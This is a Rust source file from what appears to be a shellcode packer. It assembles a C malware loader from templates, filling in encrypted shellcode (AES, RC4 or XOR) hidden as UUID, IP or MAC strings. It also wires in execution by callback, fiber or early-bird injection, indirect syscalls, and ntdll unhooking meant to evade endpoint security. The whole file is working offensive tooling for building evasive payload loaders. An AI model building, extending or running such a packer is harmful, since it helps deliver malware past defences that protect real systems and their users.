use std::fs;

pub fn generate(
    lang: &str,
    shellcode: &[u8],
    key: &[u8],
    nonce: &[u8],
    loading_technique: &str,
    obf_technique: &str,
    use_unhook: bool,
    enc_technique: &str,
    cmd: Option<&str>,
    encrypted_len: usize,
    use_ntdll_unhook: bool,
) -> Result<String, String> {
    let template_path = match lang {
        "c" => "crates/packer/src/templates/loader.c.tpl",
        _ => return Err(format!("Unsupported language: {}", lang)),
    };

    let execution_template_path = if cmd.is_some() {
        "crates/packer/src/templates/cmd_exec.c.tpl"
    } else {
        match loading_technique {
            "callback" => "crates/packer/src/templates/callback.c.tpl",
            "fiber" => "crates/packer/src/templates/fiber.c.tpl",
            "earlybird" => "crates/packer/src/templates/earlybird.c.tpl",
            _ => {
                return Err(format!(
                    "Unsupported loading technique: {}",
                    loading_technique
                ))
            }
        }
    };

    let deobfuscation_template_path = match obf_technique {
        "uuid" | "ipv4" | "ipv6" | "mac" => "crates/packer/src/templates/deobfuscation.c.tpl",
        _ => "",
    };

    let decryption_template_path = match enc_technique {
        "aes" | "rc4" | "xor" => "crates/packer/src/templates/decryption.c.tpl",
        _ => "",
    };

    let syscall_template_path = if !use_unhook {
        "crates/packer/src/templates/syscalls.c.tpl"
    } else {
        ""
    };

    let main_template_content = fs::read_to_string(template_path).map_err(|e| e.to_string())?;
    let execution_template_content =
        fs::read_to_string(execution_template_path).map_err(|e| e.to_string())?;
    let deobfuscation_template_content = if !deobfuscation_template_path.is_empty() {
        fs::read_to_string(deobfuscation_template_path).map_err(|e| e.to_string())?
    } else {
        String::new()
    };
    let decryption_template_content = if !decryption_template_path.is_empty() {
        fs::read_to_string(decryption_template_path).map_err(|e| e.to_string())?
    } else {
        String::new()
    };
    let syscall_template_content = if !syscall_template_path.is_empty() {
        fs::read_to_string(syscall_template_path).map_err(|e| e.to_string())?
    } else {
        String::new()
    };

    let ntdll_unhook_template_content = if use_ntdll_unhook {
        fs::read_to_string("crates/packer/src/templates/ntdll_unhook.c.tpl")
            .map_err(|e| e.to_string())?
    } else {
        String::new()
    };

    let unhook_define = if !use_unhook {
        "#define USE_INDIRECT_SYSCALLS"
    } else {
        ""
    };

    let ntdll_unhook_call = if use_ntdll_unhook {
        "if (!UnhookNtdll()) { return 1; }"
    } else {
        ""
    };

    let (shellcode_definition, size_calculation, deobfuscation_call) = match obf_technique {
        "uuid" | "ipv4" | "ipv6" | "mac" => {
            let raw_str = String::from_utf8_lossy(shellcode).to_string();
            let formatted_str = raw_str
                .lines()
                .map(|line| format!("\"{}\"", line))
                .collect::<Vec<String>>()
                .join(",\n    ");

            let definition = format!(
                "const char* shellcode_strings[] = {{\n    {}\n}};",
                formatted_str
            );

            let block_size = match obf_technique {
                "uuid" | "ipv6" => 16,
                "mac" => 6,
                "ipv4" => 4,
                _ => 1,
            };

            let size_calc = format!(
                "int string_count = sizeof(shellcode_strings) / sizeof(shellcode_strings[0]);\n    int shellcode_size = string_count * {};", 
                block_size
            );

            let func_name = match obf_technique {
                "uuid" => "deobfuscate_uuid",
                "ipv4" => "deobfuscate_ipv4",
                "ipv6" => "deobfuscate_ipv6",
                "mac" => "deobfuscate_mac",
                _ => "",
            };

            let deobf_call = format!(
                "{}(shellcode_strings, string_count, (unsigned char*)shellcode_mem);",
                func_name
            );

            (definition, size_calc, deobf_call)
        }
        _ => {
            let formatted_str = shellcode
                .iter()
                .map(|b| format!("0x{:02x}", b))
                .collect::<Vec<String>>()
                .join(", ");

            let definition = format!(
                "unsigned char shellcode_buf[] = {{\n    {}\n}};",
                formatted_str
            );
            let size_calc = "int shellcode_size = sizeof(shellcode_buf);".to_string();
            // Need string.h or intrinsic for memcpy, but let's assume it's available or use a loop if needed.
            // Better yet, just use a simple loop to avoid dependency if header missing.
            // But loader.c.tpl has stdio.h, usually string.h is standard. Let's trust string.h is there or add it.
            let deobf_call = "for(int i=0; i<shellcode_size; i++) ((unsigned char*)shellcode_mem)[i] = shellcode_buf[i];".to_string();

            (definition, size_calc, deobf_call)
        }
    };

    let key_str = key
        .iter()
        .map(|b| format!("0x{:02x}", b))
        .collect::<Vec<String>>()
        .join(", ");

    let nonce_str = if !nonce.is_empty() {
        let n_str = nonce
            .iter()
            .map(|b| format!("0x{:02x}", b))
            .collect::<Vec<String>>()
            .join(", ");
        format!("{{{}}}", n_str)
    } else {
        "{0}".to_string() // Should not happen for AES, but valid C
    };

    let decryption_call_str = match enc_technique {
        "aes" => format!(
            "decrypt_aes((BYTE*)shellcode_mem, {}, key, sizeof(key));",
            encrypted_len
        ),
        "rc4" => "decrypt_rc4((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
        "xor" => "decrypt_xor((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
        _ => "".to_string(),
    };

    let populated_template = main_template_content
        .replace(
            "// {{SHELLCODE_DEFINITION_PLACEHOLDER}}",
            &shellcode_definition,
        )
        .replace("// {{KEY_PLACEHOLDER}}", &key_str)
        .replace("// {{NONCE_PLACEHOLDER}}", &nonce_str)
        .replace(
            "// {{DEOBFUSCATION_FUNCTION_PLACEHOLDER}}",
            &deobfuscation_template_content,
        )
        .replace(
            "// {{EXECUTION_FUNCTION_PLACEHOLDER}}",
            &execution_template_content,
        )
        .replace(
            "// {{DECRYPTION_FUNCTION_PLACEHOLDER}}",
            &decryption_template_content,
        )
        .replace("// {{DECRYPTION_CALL_PLACEHOLDER}}", &decryption_call_str)
        .replace(
            "// {{SYSCALL_FUNCTION_PLACEHOLDER}}",
            &syscall_template_content,
        )
        .replace("// {{UNHOOK_PLACEHOLDER}}", unhook_define)
        .replace(
            "// {{NTDLL_UNHOOK_FUNCTION_PLACEHOLDER}}",
            &ntdll_unhook_template_content,
        )
        .replace("// {{NTDLL_UNHOOK_CALL_PLACEHOLDER}}", &ntdll_unhook_call)
        .replace("// {{SIZE_CALCULATION_PLACEHOLDER}}", &size_calculation)
        .replace("// {{DEOBFUSCATION_CALL_PLACEHOLDER}}", &deobfuscation_call);

    Ok(populated_template)
}
